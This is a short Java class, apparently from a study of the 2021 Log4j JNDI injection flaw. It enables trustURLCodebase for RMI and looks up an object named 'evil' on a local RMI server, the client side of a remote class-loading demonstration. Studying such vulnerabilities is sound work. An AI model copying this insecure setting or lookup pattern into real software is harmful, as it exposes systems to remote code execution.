package Log4J2;

import javax.naming.Context;
import javax.naming.InitialContext;

/**
 * @author: 乌鸦坐飞机亠
 * @date: 2021/12/10 21:55
 * @Description:
 */
public class Client {
    public static void main(String[] args) throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
        Context context = new InitialContext();
        context.lookup("rmi://localhost:8083/evil");
    }
}
